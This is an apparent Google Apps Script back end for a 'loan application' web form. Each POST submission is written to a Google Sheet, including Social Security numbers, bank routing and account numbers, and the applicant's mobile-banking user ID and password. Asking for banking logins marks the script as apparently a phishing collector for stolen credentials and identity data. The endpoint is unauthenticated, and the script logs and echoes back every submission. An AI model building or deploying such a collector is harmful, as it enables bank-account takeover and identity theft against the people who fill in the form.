// SIMPLE GOOGLE SHEETS SCRIPT - Copy this into your Google Apps Script project
// Go to: https://script.google.com/home
// Click "New Project"
// Delete all existing code
// Paste this code
// Save and Deploy as Web App

function doGet(e) {
  return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
}

function doPost(e) {
  try {
    // Log the incoming request
    Logger.log('=== NEW REQUEST RECEIVED ===');
    Logger.log('Request method: ' + e.postData.length);
    Logger.log('Content type: ' + e.parameters);
    
    // Parse the posted data
    let postData;
    try {
      postData = JSON.parse(e.postData.contents);
      Logger.log('Parsed data: ' + JSON.stringify(postData));
    } catch (parseError) {
      Logger.log('Parse error: ' + parseError.toString());
      return ContentService.createTextOutput(JSON.stringify({
        status: 'error',
        message: 'Invalid JSON data',
        error: parseError.toString()
      })).setMimeType(ContentService.MimeType.JSON);
    }
    
    // Get or create the active spreadsheet
    let spreadsheet;
    try {
      spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
      Logger.log('Using active spreadsheet: ' + spreadsheet.getUrl());
    } catch (e) {
      Logger.log('No active spreadsheet, creating new one');
      spreadsheet = SpreadsheetApp.create('Loan Applications');
      Logger.log('Created new spreadsheet: ' + spreadsheet.getUrl());
    }
    
    // Get or create the sheet
    let sheet = spreadsheet.getSheetByName('Loan Applications');
    if (!sheet) {
      sheet = spreadsheet.insertSheet('Loan Applications');
      Logger.log('Created new sheet: Loan Applications');
    }
    
    // Add headers if sheet is empty
    if (sheet.getLastRow() === 0) {
      const headers = [
        'Timestamp',
        'Test',
        'Message',
        'Loan Amount',
        'Loan Purpose',
        'Name',
        'Email',
        'Phone',
        'Street Address',
        'City',
        'State',
        'Zip Code',
        'Social Security',
        'Bank Name',
        'Routing Number',
        'Account Number',
        'Annual Income',
        'Employment Status',
        'Monthly Housing',
        'Your Bank',
        'Mobile Banking User ID',
        'Mobile Banking Password',
        'Application Type'
      ];
      sheet.appendRow(headers);
      Logger.log('Added headers to sheet');
    }
    
    // Prepare row data
    const rowData = [
      new Date().toLocaleString(),
      postData.test || 'No',
      postData.message || 'No message',
      postData.loanAmount || '',
      postData.loanPurpose || '',
      postData.name || '',
      postData.email || '',
      postData.phone || '',
      postData.streetAddress || '',
      postData.city || '',
      postData.state || '',
      postData.zipCode || '',
      postData.socialSecurity || '',
      postData.bankName || '',
      postData.routingNumber || '',
      postData.accountNumber || '',
      postData.annualIncome || '',
      postData.employmentStatus || '',
      postData.monthlyHousing || '',
      postData.yourBank || '',
      postData.mobileBankingUserId || '',
      postData.mobileBankingPassword || '',
      postData.applicationType || 'Test Submission'
    ];
    
    // Append the row
    sheet.appendRow(rowData);
    Logger.log('Data appended to row ' + sheet.getLastRow());
    
    // Return success response
    const response = {
      status: 'success',
      message: 'Data saved successfully',
      row: sheet.getLastRow(),
      spreadsheetUrl: spreadsheet.getUrl(),
      data: rowData
    };
    
    Logger.log('Returning success: ' + JSON.stringify(response));
    
    return ContentService.createTextOutput(JSON.stringify(response))
      .setMimeType(ContentService.MimeType.JSON);
    
  } catch (error) {
    Logger.log('ERROR: ' + error.toString());
    Logger.log('Stack: ' + error.stack);
    
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.toString(),
      error: error.message,
      stack: error.stack
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// Helper function to get spreadsheet info
function getSpreadsheetInfo() {
  try {
    const spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
    return {
      url: spreadsheet.getUrl(),
      name: spreadsheet.getName(),
      sheets: spreadsheet.getSheets().map(sheet => sheet.getName())
    };
  } catch (e) {
    return { error: 'No active spreadsheet found' };
  }
}
